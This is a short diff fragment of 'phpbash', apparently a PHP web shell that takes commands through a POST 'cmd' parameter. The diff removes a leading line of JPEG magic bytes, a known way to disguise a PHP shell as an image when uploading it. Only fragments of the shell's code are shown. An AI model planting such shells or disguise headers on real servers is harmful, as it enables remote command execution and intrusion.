@@ -1,4 +1,3 @@
-ÿØÿî
 <?php
 /* phpbash by Alexander Reid (Arrexel) */
 if (ISSET($_POST['cmd'])) {
@@ -21,7 +20,6 @@ if (ISSET($_POST['cmd'])) {
     die();
 }
 ?>
-
 
 <html>
     <head>
